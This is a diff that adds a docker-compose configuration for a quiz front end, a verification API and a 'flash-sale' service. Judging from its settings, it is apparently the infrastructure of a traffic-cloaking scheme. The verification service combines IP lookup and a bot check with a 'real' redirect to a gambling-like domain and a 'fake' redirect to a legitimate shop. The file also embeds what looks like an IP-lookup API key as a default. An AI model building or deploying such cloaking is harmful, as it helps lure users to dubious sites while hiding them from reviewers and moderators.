@@ -1,0 +1,42 @@
+version: '3.8'
+
+services:
+  quiz-front:
+    build:
+      context: ./services/quiz-front
+      dockerfile: Dockerfile
+    ports:
+      - "3000:3000"
+    environment:
+      - VERIFY_API_URL=http://verify-api:3001
+    depends_on:
+      - verify-api
+    restart: unless-stopped
+
+  verify-api:
+    build:
+      context: ./services/verify-api
+      dockerfile: Dockerfile
+    ports:
+      - "3001:3001"
+    environment:
+      - PORT=3001
+      - IPINFO_API_KEY=${IPINFO_API_KEY:-6e4fa2b8a2f48f}
+      - HMAC_SECRET=${HMAC_SECRET:-change-me-in-production}
+      - TURNSTILE_SECRET_KEY=${TURNSTILE_SECRET_KEY:-}
+      - REAL_REDIRECT=${REAL_REDIRECT:-https://www.win04.xyz/?type=0&cid=402&a=x}
+      - FAKE_REDIRECT=${FAKE_REDIRECT:-https://www.ubuy.com.ph/}
+    restart: unless-stopped
+
+  flash-sale:
+    build:
+      context: ./services/flash-sale
+      dockerfile: Dockerfile
+    ports:
+      - "3002:3002"
+    environment:
+      - PORT=3002
+      - HMAC_SECRET=${HMAC_SECRET:-change-me-in-production}
+      - REAL_REDIRECT=${REAL_REDIRECT:-https://www.win04.xyz/?type=0&cid=402&a=x}
+      - FAKE_REDIRECT=${FAKE_REDIRECT:-https://www.ubuy.com.ph/}
+    restart: unless-stopped
